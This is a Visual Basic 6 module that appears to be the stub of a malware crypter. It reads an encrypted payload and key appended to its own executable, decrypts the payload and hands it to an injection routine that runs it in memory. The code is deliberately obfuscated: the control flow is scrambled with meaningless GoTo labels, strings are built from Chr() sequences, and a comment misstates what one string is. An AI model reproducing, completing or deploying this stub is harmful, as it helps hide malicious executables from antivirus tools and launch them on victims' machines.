Attribute VB_Name = "Module1"
Option Explicit

Private Declare Function SetTimer Lib "user32" (ByVal hwnd As Long, ByVal nIDEvent As Long, ByVal uElapse As Long, ByVal lpTimerFunc As Long) As Long
Private Declare Function KillTimer Lib "user32" (ByVal hwnd As Long, ByVal nIDEvent As Long) As Long
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Private Declare Sub GetStartupInfoA Lib "kernel32" (lpStartupInfo As Any)

Const DATA_START = "[DATA]"
Const DATA_ARRAY = "[#]"

Dim LengteVanBestand As String
Dim LengteOrig As String
Dim EncKey As String
Dim Deneme As String

Private m_bCancel As Boolean

Public SERVICE_PROVIDER As String
Public KEY_CONTAINER As String

Private Sub Main()
SERVICE_PROVIDER = Chr(77) & Chr(105) & Chr(99) & Chr(114) & Chr(111) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(32) & Chr(83) & Chr(116) & Chr(114) & Chr(111) & Chr(110) & Chr(103) & Chr(32) & Chr(67) & Chr(114) & Chr(121) & Chr(112) & Chr(116) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(112) & Chr(104) & Chr(105) & Chr(99) & Chr(32) & Chr(80) & Chr(114) & Chr(111) & Chr(118) & Chr(105) & Chr(100) & Chr(101) & Chr(114)  'AES-256
KEY_CONTAINER = Chr(69) & Chr(110) & Chr(99) & Chr(114) & Chr(121) & Chr(112) & Chr(116) & Chr(105) & Chr(111) & Chr(110)
    
    LengteVanBestand = 0
    LengteOrig = 1
    Call ReadSettings
    If App.EXEName <> "" Then DoEvents
    SetTimer 0, Rnd * 1024, 100, AddressOf TimerProc
    Do
        DoEvents: Call Sleep(100)
    Loop Until m_bCancel
End Sub

Sub TimerProc(ByVal hwnd As Long, ByVal nIDEvent As Long, ByVal uElapse As Long, ByVal lpTimerFunc As Long)
    KillTimer hwnd, nIDEvent
 
    Dim lSize   As Long
    Dim sSize   As String * 8
    Dim sPath   As String
    'Dim cCrypt  As New Class1
    Dim bSig    As Byte
    Dim sData   As String
    
    
    If Not m_bCancel Then
GoTo PEFT_13313
TKMV_01611:
GoTo RHYI_47967
RHYI_47967:
        Seek #1, LOF(1) - (LengteVanBestand + 1): Get #1, , bSig
GoTo SDOR_73787
HSME_51577:
        m_bCancel = True
GoTo FSQS_19233
SDOR_73787:
        Seek #1, LOF(1) - 9: Get #1, , sSize
GoTo MNCS_45762
PEFT_13313:
GoTo HSME_51577
FSQS_19233:
        sPath = ThisExe
GoTo IPUW_72307
MNCS_45762:
        lSize = LengteOrig
GoTo GQON_85176
IPUW_72307:
        Open sPath For Binary Access Read As #1
GoTo TKMV_01611
GQON_85176:

        If bSig = 27 And lSize > 0 And lSize < LOF(1) Then
GoTo OLXJ_76553
MRSN_38457:
            'sData = cCrypt.DecryptString(sData, EncKey)
            sData = EncryptData(sData, EncKey, False)
GoTo AMDJ_94673
OLXJ_76553:
GoTo QCUM_36786
GIOX_64546:
            Get #1, , sData
GoTo MRSN_38457
DTHG_42798:
GoTo GIOX_64546
QCUM_36786:
            Seek #1, LOF(1) - (LengteVanBestand + 9) - lSize
GoTo VBRJ_27801
VBRJ_27801:
            sData = Space(lSize)
GoTo DTHG_42798
AMDJ_94673:
            Module2.InjectExe sPath, StrConv(sData, vbFromUnicode)
GoTo REEC_43664
REEC_43664:

        End If
    
        Close #1

    End If
End Sub

Private Function ReadSettings()
Dim DATA_SPLIT() As String
Dim DATA_PARAMS() As String
Dim GRAB_DATA As String

Open ThisExe For Binary As #1
GRAB_DATA = String(LOF(1), vbNullChar)
Get #1, , GRAB_DATA
Close #1
DATA_SPLIT() = Split(GRAB_DATA, DATA_START)
DATA_PARAMS = Split(DATA_SPLIT(1), DATA_ARRAY)
LengteVanBestand = DATA_PARAMS(0)
LengteOrig = DATA_PARAMS(1)
EncKey = DATA_PARAMS(2)
End Function



